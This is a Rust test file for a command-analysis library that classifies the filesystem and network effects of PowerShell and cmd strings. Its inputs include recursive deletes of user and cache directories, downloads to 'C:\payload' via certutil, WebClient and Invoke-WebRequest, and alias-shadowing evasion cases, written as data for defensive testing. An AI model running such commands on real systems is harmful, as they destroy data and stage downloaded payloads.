@@ -1,0 +1,246 @@
+use nah_inline::{
+    InlineInput, LanguageAnalysis, LanguageCallKind, NestedExecution, ProtectionInput,
+    interpret_language_effects,
+};
+use nah_proto::{action::FilesystemOperation, ctx::Platform};
+
+fn analyze(program: &str, code: &str) -> LanguageAnalysis {
+    interpret_language_effects(
+        InlineInput {
+            program,
+            code,
+            home: r"C:\Users\test",
+            platform: Platform::Windows,
+        },
+        ProtectionInput {
+            critical_paths: &[],
+            ambient_variables: &[],
+        },
+    )
+}
+
+#[test]
+fn powershell_filesystem_cmdlets_emit_bounded_typed_operations() {
+    let analysis = analyze(
+        "pwsh",
+        r#"Remove-Item -Recurse -Path 'C:\cache\*'; Move-Item -LiteralPath 'C:\from' -Destination 'C:\to'; Get-Content 'C:\read'; Set-Content -Path 'C:\write' -Value 'x'; Add-Content 'C:\append' 'x'; Clear-Content 'C:\clear'; 'x' | Out-File 'C:\out'; 'x' > 'C:\redirect'"#,
+    );
+    let calls = analysis.draft().calls();
+    assert!(analysis.draft().complete());
+    assert_eq!(calls.len(), 8);
+    assert_eq!(
+        calls[0].filesystems()[0].operation(),
+        FilesystemOperation::Delete
+    );
+    assert!(calls[0].filesystems()[0].recursive());
+    assert!(calls[0].filesystems()[0].pattern());
+    assert!(!calls[1].filesystems()[0].pattern());
+    assert_eq!(calls[1].filesystems()[1].identity_path(), Some(r"C:\from"));
+    assert_eq!(
+        calls[2].filesystems()[0].operation(),
+        FilesystemOperation::Read
+    );
+    assert!(calls[3..].iter().all(|call| {
+        call.filesystems()
+            .iter()
+            .all(|filesystem| filesystem.operation() == FilesystemOperation::Write)
+    }));
+}
+
+#[test]
+fn powershell_false_positive_controls_do_not_overclaim() {
+    for source in [
+        r"Remove-Item -Recurse C:\ -WhatIf",
+        r"Remove-Item -Recurse C:\ -WhatIf:$true",
+        r"Out-File C:\target -WhatIf",
+    ] {
+        let what_if = analyze("pwsh", source);
+        assert!(
+            what_if.draft().calls()[0].filesystems().is_empty(),
+            "{source}"
+        );
+    }
+    let false_what_if = analyze("pwsh", r"Remove-Item C:\target -WhatIf:$false");
+    assert_eq!(false_what_if.draft().calls()[0].filesystems().len(), 1);
+
+    let filtered = analyze(
+        "pwsh",
+        r"Remove-Item -Filter C:\ -Include C:\ -Exclude C:\ -Path C:\safe",
+    );
+    assert_eq!(
+        filtered.draft().calls()[0].filesystems()[0].requested(),
+        Some(r"C:\safe")
+    );
+
+    for source in [
+        "Remove-Item $(Get-Target)",
+        "Remove-Item @paths",
+        "Remove-Item { C:\\target }",
+        "$name = 'C:\\target'; Remove-Item $name",
+    ] {
+        assert!(!analyze("pwsh", source).draft().complete(), "{source}");
+    }
+}
+
+#[test]
+fn powershell_dialect_aliases_never_invent_download_destinations() {
+    for program in ["powershell", "pwsh"] {
+        for command in ["curl", "wget"] {
+            let analysis = analyze(
+                program,
+                &format!("{command} https://example.test/x -OutFile C:\\payload"),
+            );
+            assert!(!analysis.draft().complete());
+            assert_eq!(
+                analysis.draft().calls()[0].kind(),
+                LanguageCallKind::NetworkTransfer
+            );
+            assert!(analysis.draft().calls()[0].filesystems().is_empty());
+        }
+    }
+
+    let exact = analyze(
+        "powershell",
+        r"curl.exe -o C:\payload https://example.test/x",
+    );
+    assert!(matches!(
+        exact.report().nested_executions(),
+        [NestedExecution::Command { argv, .. }]
+            if argv.first().map(String::as_str) == Some("curl.exe")
+    ));
+}
+
+#[test]
+fn reviewed_powershell_network_forms_emit_only_their_static_targets() {
+    let analysis = analyze(
+        "pwsh",
+        r#"Invoke-WebRequest -Uri 'https://example.test/a' -OutFile 'C:\a'; Invoke-RestMethod 'https://example.test/b'; (New-Object System.Net.WebClient).DownloadFile('https://example.test/c','C:\c')"#,
+    );
+    let calls = analysis.draft().calls();
+    assert!(analysis.draft().complete());
+    assert_eq!(calls.len(), 3);
+    assert_eq!(calls[0].endpoint(), Some("https://example.test/a"));
+    assert_eq!(calls[0].filesystems()[0].requested(), Some(r"C:\a"));
+    assert!(calls[1].filesystems().is_empty());
+    assert_eq!(calls[2].filesystems()[0].requested(), Some(r"C:\c"));
+}
+
+#[test]
+fn powershell_webclient_and_redirection_stay_within_reviewed_static_shapes() {
+    for source in [
+        r"(Get-Thing System.Net.WebClient).DownloadFile('https://example.test/x','C:\x')",
+        r"(New-Object System.Net.WebClient).DownloadFile('https://example.test/x','C:\x','extra')",
+        r"(New-Object System.Net.WebClient).DownloadFile('https://example.test/x','C:\x').ToString()",
+        "<# unfinished",
+    ] {
+        assert!(!analyze("pwsh", source).draft().complete(), "{source}");
+    }
+
+    let merged = analyze("pwsh", r"Write-Output ok 2>&1");
+    assert!(merged.draft().complete());
+    assert!(merged.draft().calls()[0].filesystems().is_empty());
+}
+
+#[test]
+fn exact_windows_children_use_one_nested_argv_contract() {
+    for (program, source, child) in [
+        ("pwsh", "git status", "git"),
+        ("pwsh", "cmd /c del C:\\target", "cmd"),
+        (
+            "cmd",
+            "powershell -Command Remove-Item C:\\target",
+            "powershell",
+        ),
+        ("cmd", "cmd /c rd /s C:\\target", "cmd"),
+    ] {
+        let analysis = analyze(program, source);
+        assert!(
+            analysis
+                .report()
+                .nested_executions()
+                .iter()
+                .any(|execution| {
+                    matches!(execution, NestedExecution::Command { argv, .. }
+                if argv.first().is_some_and(|program| program.eq_ignore_ascii_case(child)))
+                })
+        );
+    }
+}
+
+#[test]
+fn static_invoke_expression_reuses_the_powershell_interpreter() {
+    let analysis = analyze(
+        "pwsh",
+        r#"Invoke-Expression "Remove-Item -Recurse -LiteralPath 'C:\Users\test'""#,
+    );
+    assert!(analysis.draft().complete());
+    assert_eq!(analysis.draft().calls().len(), 2);
+    assert_eq!(
+        analysis.draft().calls()[1].filesystems()[0].requested(),
+        Some(r"C:\Users\test")
+    );
+
+    let shadowed = analyze(
+        "pwsh",
+        "Set-Alias -Name rm -Value Write-Output; rm 'C:\\Users\\test'",
+    );
+    assert!(!shadowed.draft().complete());
+    assert!(shadowed.draft().calls().is_empty());
+
+    let removed_alias = analyze("pwsh", "Remove-Item -Path Alias:rm; rm 'C:\\Users\\test'");
+    assert!(!removed_alias.draft().complete());
+    assert!(removed_alias.draft().calls().is_empty());
+}
+
+#[test]
+fn named_move_source_keeps_the_positional_destination() {
+    let analysis = analyze("pwsh", r"Move-Item -LiteralPath C:\from C:\to");
+    assert!(analysis.draft().complete());
+    let filesystems = analysis.draft().calls()[0].filesystems();
+    assert_eq!(filesystems[0].requested(), Some(r"C:\from"));
+    assert_eq!(filesystems[1].requested(), Some(r"C:\to"));
+}
+
+#[test]
+fn cmd_filesystem_and_directory_boundaries_are_explicit() {
+    let analysis = analyze(
+        "cmd",
+        r"del /s /q C:\cache\* & rd C:\empty & rd /s /q C:\tree & move /y C:\from C:\to & type C:\read > C:\out",
+    );
+    let calls = analysis.draft().calls();
+    assert!(analysis.draft().complete());
+    assert_eq!(calls.len(), 6);
+    assert!(!calls[0].filesystems()[0].recursive());
+    assert!(calls[0].filesystems()[0].file_only_target());
+    assert!(!calls[1].filesystems()[0].recursive());
+    assert!(calls[2].filesystems()[0].recursive());
+    assert_eq!(
+        calls[3].filesystems()[0].operation(),
+        FilesystemOperation::Delete
+    );
+    assert_eq!(
+        calls[3].filesystems()[1].operation(),
+        FilesystemOperation::Write
+    );
+    assert_eq!(
+        calls[5].filesystems()[0].operation(),
+        FilesystemOperation::Read
+    );
+    assert_eq!(
+        calls[4].filesystems()[0].operation(),
+        FilesystemOperation::Write
+    );
+}
+
+#[test]
+fn reviewed_certutil_download_is_a_network_bound_write() {
+    let analysis = analyze(
+        "cmd",
+        r"certutil.exe -urlcache -split -f https://example.test/x C:\payload",
+    );
+    assert!(analysis.draft().complete());
+    let call = &analysis.draft().calls()[0];
+    assert_eq!(call.kind(), LanguageCallKind::NetworkTransfer);
+    assert_eq!(call.endpoint(), Some("https://example.test/x"));
+    assert_eq!(call.filesystems()[0].requested(), Some(r"C:\payload"));
+}
